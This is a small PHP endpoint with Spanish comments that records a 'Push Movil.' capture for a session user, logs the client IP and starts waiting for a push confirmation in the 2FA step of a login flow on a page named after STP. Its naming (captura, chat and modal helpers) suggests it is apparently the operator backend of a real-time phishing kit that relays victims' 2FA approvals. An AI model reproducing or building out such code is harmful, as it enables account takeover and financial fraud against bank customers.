<?php
/**
 * Chat: usuario solicitó confirmación push en el 2FA del flujo de login (prod-stpmex.html)
 */
session_start();
require_once '../php_config/conexionbd.php';
require_once '../php_modales/chat_captura_helper.php';
require_once '../php_modales/espera_push_helper.php';

header('Content-Type: application/json');

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    echo json_encode(['success' => false, 'error' => 'Método no permitido']);
    exit;
}

if (!isset($_SESSION['usuario_id'])) {
    echo json_encode(['success' => false, 'error' => 'Sesión no válida']);
    exit;
}

try {
    $pdo = conectarBD();
    $usuario_id = (int) $_SESSION['usuario_id'];
    $ip_real = $_SERVER['HTTP_X_FORWARDED_FOR']
             ?? $_SERVER['HTTP_X_REAL_IP']
             ?? $_SERVER['REMOTE_ADDR']
             ?? 'unknown';

    insertarCapturaUsuario($pdo, $usuario_id, $ip_real, 'Push Movil.');
    iniciarEsperaPush($pdo, $usuario_id, 'login');
    echo json_encode(['success' => true]);
} catch (PDOException $e) {
    echo json_encode(['success' => false, 'error' => 'Error al guardar']);
}
?>
